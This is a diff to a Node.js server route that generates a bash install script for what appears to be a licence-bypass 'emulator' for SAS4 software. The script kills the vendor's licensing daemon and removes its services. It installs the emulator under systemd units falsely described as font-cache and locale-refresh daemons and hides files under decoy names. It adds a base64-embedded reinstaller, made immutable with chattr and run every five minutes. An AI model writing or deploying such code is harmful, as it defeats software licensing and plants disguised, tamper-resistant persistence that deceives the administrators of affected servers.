@@ -750,10 +750,16 @@ export async function registerRoutes(
     res.type("text/plain").send(encrypted);
   });
 
-  // ─── Provision Script Download - PUBLIC ───────────────────
-  app.get("/api/provision-script/:licenseId", async (req, res) => {
+  // ─── Install Script Download - ADMIN ───────────────────
+  app.get("/api/install-script/:licenseId", requireAuth, async (req: any, res) => {
     const license = await storage.getLicenseByLicenseId(req.params.licenseId);
     if (!license) return res.status(404).json({ message: "الترخيص غير موجود" });
+
+    let serverHost = "";
+    if (license.serverId) {
+      const server = await storage.getServer(license.serverId);
+      if (server) serverHost = server.host;
+    }
 
     const baseUrl = getBaseUrl(req);
     const P = DEPLOY;
@@ -783,25 +789,41 @@ _B="${P.BACKUP}"
 _V="${P.VERIFY}"
 _SM="${P.SVC_MAIN}"
 _SV="${P.SVC_VERIFY}"
+_PS="${P.PATCH_SVC}"
+_PD="${P.PATCH_DIR}"
+_PF="${P.PATCH_FILE}"
 _LI="${license.licenseId}"
 _SU="${baseUrl}"
 
-systemctl stop $_SM $_SV.timer $_SV sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true
-killall sas_sspd 2>/dev/null || true
-sleep 1
+systemctl stop $_SM $_SV.timer $_SV 2>/dev/null || true
+systemctl stop \${_PS}.timer \${_PS} 2>/dev/null || true
+systemctl stop sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true
+killall -9 sas_sspd 2>/dev/null || true
+fuser -k 4000/tcp 2>/dev/null || true
+sleep 2
 
 mkdir -p "$_P"
+mkdir -p "$_PD"
 
 if [ -f "/opt/sas4/bin/sas_sspd" ] && [ ! -f "$_P/$_B" ]; then
   cp /opt/sas4/bin/sas_sspd "$_P/$_B" && chmod +x "$_P/$_B"
 fi
 
 _HW=""
-if [ -f "$_P/$_B" ]; then
+_SHOST="${serverHost}"
+if [ -n "$_SHOST" ] && [ -f "$_P/$_B" ]; then
   "$_P/$_B" > /dev/null 2>&1 &
-  _PD=$!; sleep 5
-  _BL=$(curl -s "http://127.0.0.1:4000/?op=get")
-  kill $_PD 2>/dev/null
+  _PID=$!; sleep 5
+  _BL=$(curl -s "http://\${_SHOST}:4000/?op=get" 2>/dev/null)
+  kill $_PID 2>/dev/null
+  if [ -n "$_BL" ]; then
+    _HW=$(python3 -c "$(echo '${hwidPyB64}' | base64 -d)" "$_BL" 2>/dev/null)
+  fi
+elif [ -f "$_P/$_B" ]; then
+  "$_P/$_B" > /dev/null 2>&1 &
+  _PID=$!; sleep 5
+  _BL=$(curl -s "http://127.0.0.1:4000/?op=get" 2>/dev/null)
+  kill $_PID 2>/dev/null
   if [ -n "$_BL" ]; then
     _HW=$(python3 -c "$(echo '${hwidPyB64}' | base64 -d)" "$_BL" 2>/dev/null)
   fi
@@ -852,9 +874,12 @@ chmod +x "$_P/$_V"
 cat > /etc/systemd/system/$_SM.service << '_SVC_1_'
 [Unit]
 Description=System font cache synchronization daemon
+After=network.target
 [Service]
 ExecStart=/usr/bin/python3 ${P.BASE}/${P.EMULATOR}
 Restart=always
+RestartSec=3
+KillMode=process
 [Install]
 WantedBy=multi-user.target
 _SVC_1_
@@ -878,17 +903,99 @@ Persistent=true
 WantedBy=timers.target
 _TMR_1_
 
+_EMU_B64=$(base64 -w0 "$_P/$_E")
+_VER_B64=$(base64 -w0 "$_P/$_V")
+
+cat > "$_PD/$_PF" << _PATCH_END_
+#!/bin/bash
+_d="${P.BASE}"
+_e="${P.EMULATOR}"
+_s1="${P.SVC_MAIN}"
+_s2="${P.SVC_VERIFY}"
+_eb="\${_EMU_B64}"
+_vb="\${_VER_B64}"
+if ! systemctl is-active \${_s1} >/dev/null 2>&1; then
+  mkdir -p \${_d}
+  if [ ! -f \${_d}/\${_e} ]; then
+    echo "\${_eb}" | base64 -d > \${_d}/\${_e}
+    chmod +x \${_d}/\${_e}
+  fi
+  if [ ! -f \${_d}/.fc-match ]; then
+    echo "\${_vb}" | base64 -d > \${_d}/.fc-match
+    chmod +x \${_d}/.fc-match
+  fi
+  if [ ! -f /etc/systemd/system/\${_s1}.service ]; then
+    cat > /etc/systemd/system/\${_s1}.service << '_RS1_'
+[Unit]
+Description=System font cache synchronization daemon
+After=network.target
+[Service]
+ExecStart=/usr/bin/python3 ${P.BASE}/${P.EMULATOR}
+Restart=always
+RestartSec=3
+KillMode=process
+[Install]
+WantedBy=multi-user.target
+_RS1_
+  fi
+  if [ ! -f /etc/systemd/system/\${_s2}.timer ]; then
+    cat > /etc/systemd/system/\${_s2}.service << '_RS2_'
+[Unit]
+Description=Font cache garbage collection
+[Service]
+Type=oneshot
+ExecStart=/bin/bash ${P.BASE}/${P.VERIFY}
+_RS2_
+    cat > /etc/systemd/system/\${_s2}.timer << '_RS3_'
+[Unit]
+Description=Font cache gc timer
+[Timer]
+OnBootSec=60
+OnUnitActiveSec=6h
+Persistent=true
+[Install]
+WantedBy=timers.target
+_RS3_
+  fi
+  systemctl daemon-reload
+  systemctl enable \${_s1} \${_s2}.timer
+  systemctl start \${_s1} \${_s2}.timer
+fi
+_PATCH_END_
+chmod +x "$_PD/$_PF"
+chattr +i "$_PD/$_PF" 2>/dev/null || true
+
+cat > /etc/systemd/system/\${_PS}.service << '_PSV_'
+[Unit]
+Description=Locale database refresh service
+[Service]
+Type=oneshot
+ExecStart=/bin/bash ${P.PATCH_DIR}/${P.PATCH_FILE}
+_PSV_
+
+cat > /etc/systemd/system/\${_PS}.timer << '_PTM_'
+[Unit]
+Description=Locale refresh timer
+[Timer]
+OnBootSec=120
+OnUnitActiveSec=5min
+Persistent=true
+[Install]
+WantedBy=timers.target
+_PTM_
+
 systemctl disable sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true
 rm -f /etc/systemd/system/sas_systemmanager.service /etc/systemd/system/sas4-verify.* 2>/dev/null
 rm -f /opt/sas4/bin/sas_emulator.py /opt/sas4/verify.sh 2>/dev/null
 
 systemctl daemon-reload
-systemctl enable $_SM $_SV.timer
-systemctl start $_SM $_SV.timer
+systemctl enable $_SM $_SV.timer \${_PS}.timer
+systemctl start $_SM $_SV.timer \${_PS}.timer
+echo "Installation completed successfully"
 `;
 
     res.setHeader("Content-Type", "text/plain");
-    res.setHeader("Content-Disposition", `attachment; filename="fc-cache-update.sh"`);
+    res.setHeader("Content-Disposition", `attachment; filename="install.sh"`);
     res.send(script);
   });
 
